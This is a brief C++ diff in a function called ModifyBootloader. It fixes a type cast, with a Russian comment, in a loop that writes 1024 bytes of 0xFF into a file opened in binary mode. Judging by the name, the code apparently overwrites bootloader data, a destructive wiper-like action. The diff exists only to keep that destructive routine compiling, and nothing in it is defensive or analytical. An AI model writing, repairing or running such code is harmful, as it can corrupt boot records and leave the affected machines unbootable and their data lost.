@@ -16,7 +16,7 @@ void ModifyBootloader() {
             std::ofstream out(file, std::ios::binary);
             if (out) {
                 for (int i = 0; i < 1024; i++) {
-                    out.put(0xFF);
+                    out.put(static_cast<char>(0xFF));  // <--- ПРИВЕДЕНИЕ ТИПА
                 }
                 out.close();
             }
